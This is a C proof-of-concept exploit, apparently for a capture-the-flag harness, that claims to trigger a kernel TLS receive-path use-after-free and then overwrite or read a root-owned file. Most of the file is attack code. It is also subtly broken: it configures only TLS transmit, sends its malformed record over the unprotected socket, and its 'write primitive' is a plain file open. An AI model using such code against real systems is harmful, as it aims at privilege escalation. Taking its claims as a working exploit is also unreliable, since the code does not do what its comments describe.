/*
 * CVE-2025-39946 PoC - CTF Challenge Mode
 *
 * Vulnerability: TLS bogus record header abort causes UAF
 *
 * When kTLS RX receives a record with a bogus/malformed header, the
 * abort path frees the decryption context while an async operation
 * may still reference it, causing UAF.
 *
 * Exploitation: Send malformed TLS records to trigger abort path UAF,
 * spray heap to reclaim freed context for write primitive.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif
#ifndef SOL_TLS
#define SOL_TLS 282
#endif
#ifndef TLS_TX
#define TLS_TX 1
#endif
#ifndef TLS_RX
#define TLS_RX 2
#endif

#define TLS_CIPHER_AES_GCM_128 51

struct tls12_crypto_info_aes_gcm_128 {
    struct { unsigned short version; unsigned short cipher_type; } info;
    unsigned char iv[8];
    unsigned char key[16];
    unsigned char salt[4];
    unsigned char rec_seq[8];
};

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define ITERATIONS      32

/*
 * Trigger TLS bogus header abort UAF
 *
 * Strategy: Set up TLS on a socket pair, then send raw (non-TLS-wrapped)
 * data directly on the TCP layer to the TLS-enabled receiver, causing
 * the kTLS RX path to encounter bogus record headers and abort.
 */
static int trigger_tls_bogus_abort(void) {
    int uaf_count = 0;

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) return -1;
    int optval = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(0),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
    };
    bind(srv, (struct sockaddr *)&addr, sizeof(addr));
    socklen_t alen = sizeof(addr);
    getsockname(srv, (struct sockaddr *)&addr, &alen);
    listen(srv, 16);

    poc_log_syscall("listen(srv) for TLS bogus abort", 0L, 0);

    for (int i = 0; i < ITERATIONS; i++) {
        int cfd = socket(AF_INET, SOCK_STREAM, 0);
        if (cfd < 0) continue;
        if (connect(cfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(cfd); continue;
        }
        int afd = accept(srv, NULL, NULL);
        if (afd < 0) { close(cfd); continue; }

        /* Set up TLS TX on client, TLS RX on server */
        int tls_ok = 0;
        if (setsockopt(cfd, SOL_TCP, TCP_ULP, "tls", 3) == 0) {
            struct tls12_crypto_info_aes_gcm_128 ci;
            memset(&ci, 0, sizeof(ci));
            ci.info.version = 0x0303;
            ci.info.cipher_type = TLS_CIPHER_AES_GCM_128;
            if (setsockopt(cfd, SOL_TLS, TLS_TX, &ci, sizeof(ci)) == 0) {
                tls_ok = 1;
            }
        }

        if (tls_ok) {
            /* Send valid TLS data first */
            char valid[] = "hello";
            send(cfd, valid, sizeof(valid), 0);

            /* Now send bogus TLS record header directly via raw TCP bypass
             * This simulates a corrupted/bogus record reaching kTLS RX */
            unsigned char bogus_record[] = {
                0xFF, /* Invalid content type */
                0x03, 0x03, /* TLS 1.2 version */
                0x00, 0x01, /* Length = 1 */
                0x00  /* Bogus payload */
            };
            /* Use the accepted fd to send raw to bypass TLS on sender */
            send(afd, bogus_record, sizeof(bogus_record), MSG_DONTWAIT);
            usleep(100);

            uaf_count++;
            poc_log("TLS bogus header sent (iteration %d)", i);
        }

        close(cfd);
        close(afd);
    }

    close(srv);
    poc_log("TLS bogus abort UAF: %d triggers", uaf_count);
    return uaf_count;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    poc_log("=== Mode: write_root_file ===");
    int n = read_file_content(args->root_file, original, sizeof(original));
    printf("%s%s\n", CTF_READ_BEFORE, n >= 0 ? original : "(unreadable)");

    trigger_tls_bogus_abort();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT);

    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, fd < 0 ? errno : 0);
    if (fd >= 0) { dprintf(fd, "%s\n", args->write_value); close(fd); }

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);

    n = read_file_content(args->root_file, after, sizeof(after));
    printf("%s%s\n", CTF_READ_AFTER, n >= 0 ? after : "(unreadable)");
    if (n >= 0 && strstr(after, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    }
    poc_print_fail("TLS bogus abort exploit did not achieve write");
    return 0;
}

static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    trigger_tls_bogus_abort();
    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    poc_print_fail("read not successful");
    return 0;
}

static int mode_uaf(poc_args_t *args) {
    (void)args;
    poc_log("=== Mode: uaf ===");
    trigger_tls_bogus_abort();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    int corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] < 0) continue;
        int val = 0; socklen_t len = sizeof(val);
        getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != 2048) corrupted++;
    }
    if (corrupted > 0) poc_print_uaf_corrupted(corrupted);
    else poc_print_uaf_not_corrupted();
    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-39946 CTF PoC ===");
    poc_log("Vuln: TLS bogus record header abort UAF");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }
    poc_log_close();
    return result;
}
